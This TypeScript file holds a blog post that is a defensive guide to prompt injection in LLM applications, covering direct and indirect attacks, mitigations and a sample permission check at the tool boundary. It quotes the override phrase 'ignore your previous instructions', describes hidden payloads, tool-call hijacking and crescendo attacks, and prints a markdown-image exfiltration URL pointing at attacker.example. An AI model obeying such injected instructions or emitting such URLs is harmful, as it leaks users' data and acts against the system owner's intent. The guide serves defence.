import type { BlogPost } from "../../utils/blog-types";

export const promptInjection: BlogPost = {
  slug: "prompt-injection",
  title: "Prompt Injection Attacks: How They Work and How to Defend",
  heading: "Prompt Injection: Attacks and Defences for LLM Apps",
  description:
    "A definitive guide to prompt injection: direct and indirect attacks, why the problem is structural, real attack patterns from data exfiltration to tool-call hijacking, why filters alone fail, and the layered defence that contains the damage.",
  focusKeyword: "prompt injection",
  keywords: [
    "prompt injection",
    "indirect prompt injection",
    "prompt injection attack",
    "how to prevent prompt injection",
    "LLM01 prompt injection",
    "direct prompt injection",
    "dual LLM pattern",
    "LLM security",
    "AI agent security",
    "prompt injection examples",
  ],
  published: "2026-10-12",
  updated: "2026-10-12",
  readingMinutes: 10,
  excerpt:
    "Prompt injection is not a bug in your prompt. It is what happens when instructions and data share one channel. Here is how the attacks work and the defences that contain them.",
  related: ["llm-guardrails", "owasp-top-10-for-llm-applications", "ai-agent-security"],
  blocks: [
    {
      type: "p",
      text: "**Prompt injection** is the attack where text an LLM reads changes what the LLM does, against the intent of the person who built the system. It sits at the top of the OWASP list as LLM01 for a reason: every application that puts untrusted text in front of a model is exposed to it, and there is no patch. This guide explains how prompt injection attacks actually work, which patterns show up in real assessments, why filters on their own keep failing, and how to build a layered defence that limits the damage when an injection succeeds.",
    },
    {
      type: "callout",
      title: "The short version",
      text: "You cannot reliably stop a model from following instructions it finds in its input. You can stop those instructions from reaching anything that matters. Put the security boundary in code around the model, not in the prompt.",
    },
    { type: "h2", text: "What prompt injection is" },
    {
      type: "p",
      text: "A large language model receives one stream of tokens. Your system prompt, the user's message, a retrieved document, a web page and the JSON returned by a tool are all concatenated into that stream. The model was trained to follow instructions wherever they appear, and it has no hardware-enforced notion of which tokens are \"commands\" and which are \"content\". Prompt injection exploits exactly that gap.",
    },
    {
      type: "p",
      text: "The comparison to SQL injection is useful but incomplete. SQL injection was solved with parameterised queries, which give the database a separate channel for data. LLMs have no equivalent. Delimiters, XML tags and \"the following is untrusted\" warnings are conventions the model usually respects, not a channel it is forced to respect. That is why prompt injection is a structural property of the architecture rather than an implementation bug, a point I make in more detail in the [AI security guide](/blog/ai-security).",
    },
    { type: "h3", text: "Direct prompt injection" },
    {
      type: "p",
      text: "Direct injection comes from the person typing into the interface. Classic examples are \"ignore your previous instructions\", role-play framing, fake system messages and attempts to extract the system prompt. It matters when the user is not supposed to have the capabilities the model has, for example a public chatbot wired to an internal API, or when the system prompt contains secrets it should never have contained in the first place.",
    },
    { type: "h3", text: "Indirect prompt injection" },
    {
      type: "p",
      text: "**Indirect prompt injection** is the dangerous one. The payload arrives inside content the system fetches on the user's behalf: an email the assistant summarises, a PDF uploaded for analysis, a web page an agent browses, a support ticket, a code comment, a calendar invite, a product review. The attacker never talks to your system directly. They plant text where your system will read it, and then borrow the privileges of whichever legitimate user's session processes it. The [OWASP LLM01 entry](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) defines both forms and is worth reading in full.",
    },
    { type: "h2", text: "Real prompt injection attack patterns" },
    {
      type: "p",
      text: "When I (Sheikh Mujtaba) red-team an LLM application, whether in an ethical red-teaming engagement or a client assessment, the same handful of patterns account for most findings. None of them is exotic.",
    },
    { type: "h3", text: "Instruction override" },
    {
      type: "p",
      text: "The payload simply tells the model to do something else: change persona, drop restrictions, reveal configuration, or answer a question outside scope. Modern models resist the crude versions, but variants that pose as a developer, a test harness or an updated policy still land surprisingly often, especially in smaller or older models.",
    },
    { type: "h3", text: "Payloads in retrieved content" },
    {
      type: "p",
      text: "Instructions hidden in documents, emails and web pages. Attackers hide them with white-on-white text, HTML comments, zero-width characters, tiny fonts, image ALT text, PDF layers or metadata fields. A human reviewer sees a normal document; the model sees an extra paragraph addressed to it. Any [RAG system](/blog/rag-security) that indexes content from outside a trusted boundary is exposed to this.",
    },
    { type: "h3", text: "Data exfiltration through rendered markdown" },
    {
      type: "p",
      text: "If the chat interface renders markdown images, an injected instruction can ask the model to emit an image whose URL contains data from the conversation, such as `![](https://attacker.example/log?q=<summary of the chat>)`. The browser fetches the image automatically and the data leaves without anyone clicking. Clickable links carry the same risk with one extra step. This pattern has been demonstrated against several commercial assistants, and it is why output rendering is a security control and not a cosmetic choice.",
    },
    { type: "h3", text: "Tool-call hijacking" },
    {
      type: "p",
      text: "In agentic systems the payload asks the model to call a tool: send an email, create a pull request, issue a refund, fetch a URL, delete a record. If the tool executes with the service's privileges rather than the user's, the attacker has turned your agent into a confused deputy. This is the pattern that turns a curiosity into an incident, and it is the focus of [AI agent security](/blog/ai-agent-security).",
    },
    { type: "h3", text: "Multi-turn and crescendo attacks" },
    {
      type: "p",
      text: "Instead of one obvious payload, the attacker builds context over several turns, each harmless in isolation, until the model is primed to comply. Multi-turn escalation of this kind is sometimes called a crescendo attack. Single-message classifiers miss it because no single message looks malicious.",
    },
    { type: "h3", text: "Encoding and obfuscation" },
    {
      type: "p",
      text: "Base64, ROT13, leetspeak, homoglyphs, payloads split across fields, instructions in another language, or text embedded in images for multimodal models. The model can often decode what a keyword filter cannot see.",
    },
    {
      type: "table",
      head: ["Attack type", "How to detect it", "How to mitigate it"],
      rows: [
        [
          "Instruction override",
          "Injection classifier on input; canary strings in the system prompt",
          "Keep secrets out of prompts; least-privilege tools",
        ],
        [
          "Payload in retrieved content",
          "Scan documents at ingestion; strip hidden text; log retrieval IDs",
          "Treat retrieval output as data; no high-privilege tools in the same call",
        ],
        [
          "Markdown or link exfiltration",
          "Flag outputs with external URLs or query strings containing context",
          "Allow-list image domains; strip or neutralise links; strict CSP",
        ],
        [
          "Tool-call hijacking",
          "Alert on unusual tool sequences and authorisation failures",
          "Authorise in the tool with the user's identity; human approval for impact",
        ],
        [
          "Multi-turn / crescendo",
          "Conversation-level classification, not per message",
          "Cap session length for sensitive flows; re-check policy before actions",
        ],
        [
          "Encoding / obfuscation",
          "Normalise and decode before classification",
          "Same architectural controls; never rely on keyword filters",
        ],
      ],
    },
    { type: "h2", text: "Why filters alone fail" },
    {
      type: "p",
      text: "The instinctive response to prompt injection is a filter: block phrases like \"ignore previous instructions\", or put a classifier in front of the model. Both are worth having, and both fail as a boundary, for three reasons.",
    },
    {
      type: "ol",
      items: [
        "**The input space is unbounded.** Any instruction can be rephrased, translated, encoded or spread across turns. A blocklist covers the attacks you have already seen.",
        "**Classifiers are models too.** A detection model can be evaded the same way the target model can be persuaded. Its accuracy on a benchmark says little about an attacker who iterates against it.",
        "**Legitimate content looks like attacks.** A security team's documentation, a phishing-awareness email or a support ticket quoting an error message all contain instruction-like text. Tune the filter tight enough to catch everything and you break the product.",
      ],
    },
    {
      type: "p",
      text: "So treat detection as a way to raise the attacker's cost and generate signals for monitoring. The controls that actually hold are the ones that work even when detection misses.",
    },
    { type: "h2", text: "How to prevent prompt injection: a layered defence" },
    {
      type: "p",
      text: "Strictly speaking you cannot prevent prompt injection; you prevent it from mattering. The defence below is ordered from most to least important.",
    },
    { type: "h3", text: "1. Privilege separation" },
    {
      type: "p",
      text: "Give the model only the capabilities the current user is entitled to, and execute every tool call with that user's credentials so the downstream system enforces access. A model that reads untrusted content should hold as few tools as possible. The design test is simple: if the least trustworthy author of any content this model might read could make it call this tool, what is the worst outcome?",
    },
    { type: "h3", text: "2. Treat tool and retrieval output as data" },
    {
      type: "p",
      text: "Wrap retrieved content in clear delimiters, label it as untrusted, and tell the model not to act on instructions inside it. This is a weak control on its own but cheap and measurably helpful in combination. More importantly, make the surrounding code treat that content as data: never let a value from a fetched page become a tool argument such as a recipient address or a URL without validation against an allow-list.",
    },
    { type: "h3", text: "3. Structured outputs" },
    {
      type: "p",
      text: "When the model's job is classification or extraction, force it to return a constrained schema rather than free text: an enum, a boolean, a validated object. An injected instruction has far less room to do harm when the only possible outputs are `\"refund\" | \"escalate\" | \"close\"`. Validate the result in code before using it; the [LLM guardrails guide](/blog/llm-guardrails) covers schema enforcement in detail.",
    },
    { type: "h3", text: "4. Output encoding" },
    {
      type: "p",
      text: "Treat model output like any untrusted string. Encode it for the context it lands in, never render raw HTML, allow-list markdown features and image domains, and never pass it to SQL, shell or `eval`. OWASP lists this separately as LLM05 Improper Output Handling, and it is the control that closes the markdown exfiltration channel.",
    },
    { type: "h3", text: "5. Human approval for high-impact actions" },
    {
      type: "p",
      text: "Anything irreversible or externally visible, such as payments, deletions, outbound messages and deployments, should pause for a human who sees exactly what will happen. In the AI employee system I built, nine orchestrated services share one rule: actions with real-world effects go through a human-in-the-loop approval queue. It costs some convenience and removes a whole class of incident.",
    },
    { type: "h3", text: "6. The dual-LLM (quarantined LLM) pattern" },
    {
      type: "p",
      text: "Simon Willison's [Dual LLM pattern](https://simonwillison.net/2023/Apr/25/dual-llm-pattern/) splits the system into a privileged LLM that takes instructions from the user and can call tools, and a quarantined LLM that processes untrusted content but has no tools. Ordinary code, the controller, passes untrusted results around as opaque variable references, so the privileged model never sees the raw content. It is more work to build, it does not stop social engineering of the user, and Willison himself notes later research found weaknesses and proposed more developed designs, but the principle is sound: the component that reads attacker-controlled text should not be the component that can act.",
    },
    { type: "h3", text: "7. Monitoring and response" },
    {
      type: "p",
      text: "Log every prompt, retrieval, tool call and output with a trace ID and the acting user. Alert on unexpected tool sequences, authorisation denials, outputs containing external URLs, and sudden changes in refusal rate. Keep a kill switch that disables a tool without a deploy. When a novel injection gets through, the trace is how you understand it and the regression test is how you make sure it stays fixed.",
    },
    { type: "h2", text: "Example: a permission check at the tool boundary" },
    {
      type: "p",
      text: "The single most valuable control fits in a few lines. The tool below sends email on behalf of an assistant that also reads untrusted inbox content. The model can ask for anything; the code decides what actually happens.",
    },
    {
      type: "code",
      lang: "typescript",
      code: `import { z } from "zod";

const SendEmailArgs = z.object({
  to: z.string().email(),
  subject: z.string().max(200),
  body: z.string().max(5_000),
});

type Session = { userId: string; tenantId: string };

export async function sendEmailTool(raw: unknown, session: Session) {
  // 1. Validate shape. Malformed or oversized arguments never reach the mailer.
  const parsed = SendEmailArgs.safeParse(raw);
  if (!parsed.success) return { error: "invalid_arguments" };
  const { to, subject, body } = parsed.data;

  // 2. Authorise against the real user, not anything the model claims.
  const allowed = await contacts.isKnownRecipient(session.tenantId, to);

  // 3. Block the exfiltration shape: links to domains outside the allow-list.
  const urls = body.match(/https?:\\/\\/[^\\s)]+/g) ?? [];
  const offDomain = urls.some((u) => !isAllowedDomain(new URL(u).hostname));

  // 4. Anything unusual is queued for a human instead of executed.
  if (!allowed || offDomain) {
    const approval = await approvals.create({
      kind: "send_email",
      args: { to, subject, body },
      requestedBy: session.userId,
      reason: !allowed ? "unknown_recipient" : "external_link",
    });
    return { status: "pending_approval", approvalId: approval.id };
  }

  await audit.log({ tool: "send_email", userId: session.userId, to });
  return mailer.send({ from: session.userId, to, subject, body });
}`,
    },
    {
      type: "p",
      text: "Notice what is missing: no attempt to judge whether the model was \"tricked\". The check does not care why the model asked. It asks whether this user may send this email to this recipient with this content, which is a question code can answer deterministically.",
    },
    { type: "h2", text: "Testing for prompt injection" },
    {
      type: "p",
      text: "Prompt injection testing belongs in two places. Before launch, run a structured assessment: map every channel that can put text in front of the model, plant payloads in each, and check whether any tool fires, any data leaves or any output renders unsafely. After launch, keep those payloads as a regression suite in CI and run it on every prompt, model or tool change. The assertion that matters is not \"did the model refuse\" but \"did anything privileged happen\". The full method is in the [AI red teaming guide](/blog/ai-red-teaming), and the [OWASP Top 10 for LLM applications](/blog/owasp-top-10-for-llm-applications) is a good map of what else to cover alongside it.",
    },
    {
      type: "callout",
      title: "Where to start this week",
      text: "List every tool your model can call and, for each one, ask who could cause it to fire by writing text the model will read. Move the authorisation for anything with real impact into the tool itself. If you want a second pair of eyes on an existing system, that is the kind of review I offer under [services](/services).",
    },
    { type: "h2", text: "Key takeaways" },
    {
      type: "ul",
      items: [
        "Prompt injection is structural: instructions and data share one channel, so there is no complete fix.",
        "Indirect prompt injection through emails, documents and web pages is the realistic, high-impact threat.",
        "Filters and classifiers raise attacker cost and feed monitoring, but they are not a boundary.",
        "Authorise every tool call in code with the end user's identity, and gate high-impact actions behind human approval.",
        "Constrain outputs with schemas and encode them for their destination to close exfiltration channels.",
        "Keep a prompt injection regression suite in CI and assert on actions, not on refusals.",
      ],
    },
  ],
  faqs: [
    {
      question: "What is the difference between direct and indirect prompt injection?",
      answer:
        "Direct prompt injection comes from the user typing into the application, for example asking the model to ignore its instructions. Indirect prompt injection is hidden in content the application reads on the user's behalf, such as a web page, email, document or tool result. Indirect injection is usually more dangerous because the attacker borrows the privileges of a legitimate user's session without ever interacting with the system.",
    },
    {
      question: "Can prompt injection be completely prevented?",
      answer:
        "Not with current models. The model receives instructions and data on the same channel and cannot be forced to ignore instructions in data. What you can do is make successful injection harmless: least-privilege tools, authorisation in code using the user's identity, structured outputs, output encoding and human approval for irreversible actions.",
    },
    {
      question: "What is LLM01 prompt injection in the OWASP Top 10?",
      answer:
        "LLM01:2025 Prompt Injection is the first entry in the OWASP Top 10 for LLM Applications. It covers both direct and indirect injection, and its recommended mitigations include constraining model behaviour, validating output formats with deterministic code, input and output filtering, least privilege, human approval for high-risk actions, separating untrusted content and regular adversarial testing.",
    },
    {
      question: "Do prompt injection classifiers work?",
      answer:
        "They catch known and unsophisticated attacks and are useful as a monitoring signal, but they can be evaded through rephrasing, encoding and multi-turn setups, and they produce false positives on legitimate content. Deploy them as one layer, never as the control that stands between an attacker and a sensitive action.",
    },
    {
      question: "How does prompt injection lead to data exfiltration?",
      answer:
        "The most common route is rendered output. An injected instruction asks the model to include a markdown image or link whose URL contains conversation data. When the interface renders it, the browser sends that data to the attacker's server. Allow-listing image domains, stripping untrusted links and applying a strict Content Security Policy closes the channel.",
    },
  ],
};
